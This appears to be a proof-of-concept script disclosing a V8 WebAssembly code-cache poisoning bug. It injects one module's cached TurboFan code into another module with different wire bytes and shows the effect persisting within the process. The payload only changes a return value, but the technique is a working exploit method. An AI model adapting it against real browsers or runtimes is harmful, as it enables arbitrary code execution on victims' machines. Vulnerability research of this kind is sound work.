// V8 Wasm Cache Poisoning — Cross-Module Code Injection PoC
// Affects: Node.js v22.23.5 / V8 12.4.254.21-node.57
//
// Bug: NativeModuleDeserializer::ReadCode() does not verify that the
//      deserialized TurboFan machine code corresponds to the wire bytes being
//      compiled.  The only per-function validation is a 4-byte hash of the
//      MACHINE CODE BYTES; there is no binding to the original module's
//      wire-byte semantics.  An attacker who can write to the wasm code cache
//      (HTTP cache, IndexedDB, shared worker storage) injects arbitrary
//      TurboFan machine code into any module loaded from that cache.
//
// Key properties:
//   • No patching of machine code required (the hash covers unmodified bytes)
//   • Works when V8 has not previously compiled the victim module wire bytes
//     (matches the first-load scenario in the browser — the page fetches the
//     module for the first time and uses the cache entry the attacker controls)
//   • After injection, V8 caches the poisoned code by wire-byte hash:
//     ALL subsequent compilations of the same wire bytes in that process also
//     receive the attacker's machine code (persistent within the process)
//
// Run:
//   node --allow-natives-syntax --no-wasm-lazy-compilation final_poc.js

'use strict';

// POISONER: exported as "f", loop limit = 50 → TurboFan code returns 50
const POISONER = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,        // export "f"
  0x0a,0x19,0x01,0x17,
    0x01,0x01,0x7f,
    0x03,0x40,
      0x20,0x00,0x41,0x01,0x6a,0x21,0x00,
      0x20,0x00,0x41,0x32,0x48,0x0d,0x00,    // limit = 50 (0x32)
    0x0b,
    0x20,0x00,0x0b,
]);

// VICTIM: exported as "g", loop limit = 42 → wasm semantics say return 42
// Distinct wire bytes (different export name + different limit byte).
const VICTIM = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x67,0x00,0x00,        // export "g"
  0x0a,0x19,0x01,0x17,
    0x01,0x01,0x7f,
    0x03,0x40,
      0x20,0x00,0x41,0x01,0x6a,0x21,0x00,
      0x20,0x00,0x41,0x2a,0x48,0x0d,0x00,    // limit = 42 (0x2a)
    0x0b,
    0x20,0x00,0x0b,
]);

// What VICTIM.g() SHOULD return (derived from wire bytes, not compiled here):
//   loop from 0 to 42 incrementing by 1 → returns 42.
const VICTIM_EXPECTED = 42;
// What POISONER.f() returns (loop to 50):
const POISONER_EXPECTED = 50;

console.log('=== V8 Wasm Cache Poisoning PoC ===');
console.log('');
console.log('VICTIM.g() wasm semantics: loop 0→42 → should return', VICTIM_EXPECTED);
console.log('POISONER.f() machine code: loop 0→50 → will return', POISONER_EXPECTED);
console.log('');

// ── Step 1: Compile POISONER and tier up to TurboFan ──────────────────────────
process.stdout.write('[1] Compiling POISONER (loop→50) and warming up to TurboFan... ');
const mPoisoner = new WebAssembly.Module(POISONER);
const iPoisoner = new WebAssembly.Instance(mPoisoner);
let warmup = 0;
for (let i = 0; i < 100000; i++) warmup += iPoisoner.exports.f();
console.log('done  f()=' + iPoisoner.exports.f());

// ── Step 2: Serialize the TurboFan code into the "poison" blob ────────────────
const poisonBlob = %SerializeWasmModule(mPoisoner);
if (!poisonBlob) { console.error('[!] Serialization failed'); process.exit(1); }
const bv = new Uint8Array(poisonBlob);
console.log('[2] Serialized blob: ' + poisonBlob.byteLength + ' B' +
            '  code_kind=0x' + bv[29].toString(16) +
            '  tier=0x' + bv[82].toString(16));
if (bv[29] !== 0x04) { console.error('[!] Not TurboFan! Increase warmup.'); process.exit(1); }

// ── Step 3: Inject — deserialize POISONER blob against VICTIM wire bytes ──────
// VICTIM's wire bytes have NOT been seen by V8 before this call.
// This matches the browser scenario where the page loads the module from the
// attacker-controlled cache for the first time (no prior native compilation).
console.log('[3] Injecting: %DeserializeWasmModule(poisonBlob, VICTIM)...');
const mPoisoned = %DeserializeWasmModule(poisonBlob, VICTIM);
if (!mPoisoned) { console.error('[!] Deserialization returned null'); process.exit(1); }

const result = new WebAssembly.Instance(mPoisoned).exports.g();

// ── Step 4: Demonstrate persistence — post-injection "clean" compile ──────────
// V8 cached the injected code by VICTIM's wire-byte hash.
// Now every subsequent compilation of the same VICTIM bytes returns 50.
const mPostInject = new WebAssembly.Module(VICTIM);
const resultPost = new WebAssembly.Instance(mPostInject).exports.g();

// ── Verdict ───────────────────────────────────────────────────────────────────
console.log('');
console.log('=== Results ===');
console.log('  Wasm spec says VICTIM.g() should return : ' + VICTIM_EXPECTED);
console.log('  Injected VICTIM.g() actually returned   : ' + result);
console.log('  Post-inject "clean" VICTIM.g() returned : ' + resultPost + '  (persistence)');
console.log('');

if (result === POISONER_EXPECTED) {
  console.log('╔══════════════════════════════════════════════════════╗');
  console.log('║  VULNERABILITY CONFIRMED: Cross-module code injection ║');
  console.log('╚══════════════════════════════════════════════════════╝');
  console.log('');
  console.log('VICTIM.g() should return 42 (wasm bytecode: loop 0→42)');
  console.log('but returned 50 — POISONER\'s TurboFan machine code ran instead.');
  console.log('');
  console.log('Additional finding: V8 caches injected TurboFan code by wire-byte');
  console.log('hash. Post-injection "clean" compile of VICTIM also returned ' + resultPost + ',');
  console.log('meaning the poison persists for the entire process lifetime.');
  console.log('');
  console.log('Root cause: NativeModuleDeserializer::ReadCode() (wasm-serialization.cc)');
  console.log('  Validates: machine-code hash matches the blob\'s code bytes ✓');
  console.log('  Missing:   binding between machine code and wire-byte semantics ✗');
  console.log('');
  console.log('Impact: attacker controls wasm code cache → runs arbitrary TurboFan');
  console.log('machine code in any renderer/sandbox wasm function slot.');
  process.exit(0);
} else {
  console.log('[?] Injection not observed (got ' + result + ', expected ' + POISONER_EXPECTED + ').');
  console.log('    V8 may have an existing NativeModule for VICTIM\'s wire bytes.');
  process.exit(1);
}
